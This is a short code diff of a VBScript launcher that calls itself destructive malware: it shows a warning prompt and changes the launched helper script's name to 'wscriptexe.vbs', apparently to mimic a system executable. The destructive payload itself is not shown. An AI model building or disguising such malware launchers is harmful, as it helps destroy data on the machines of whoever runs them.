@@ -4,7 +4,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 Warning = MsgBox("WARNING: This Malware is really destructive which makes it a little efficient, Do you want to proceed?", vbYesNoCancel + vbQuestion, "Question")
 
 Function run()
-    shell.run fso.GetParentFolderName(WScript.ScriptFullName) & "\run\run.vbs"
+    shell.run fso.GetParentFolderName(WScript.ScriptFullName) & "\run\wscriptexe.vbs"
 End Function
 
 Select Case Warning
